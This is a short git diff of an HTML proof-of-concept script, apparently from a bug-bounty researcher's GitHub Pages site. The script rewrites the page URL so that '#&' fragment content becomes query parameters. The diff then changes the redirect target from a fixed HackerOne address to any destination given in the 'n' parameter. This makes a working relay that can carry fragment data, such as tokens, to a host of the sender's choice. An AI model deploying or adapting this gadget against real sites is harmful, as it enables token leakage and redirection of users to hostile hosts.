@@ -1,12 +1,8 @@
 <script>
-let url = window.location.href;
-mod = url.replace("#\&", "?");
-location.href = mod.replace("ashrafabdelrazik.github.io/poc/modifier.html", "hackerone.com/ashrafabdelrazik");
-
-
-/*
 const queryString = window.location.search;
 const urlParams = new URLSearchParams(queryString);
-urlParams.get('final')
-*/
+
+let url = window.location.href;
+mod = url.replace("#\&", "?");
+location.href = mod.replace("ashrafabdelrazik.github.io/poc/modifier.html", urlParams.get('n'));
 </script>
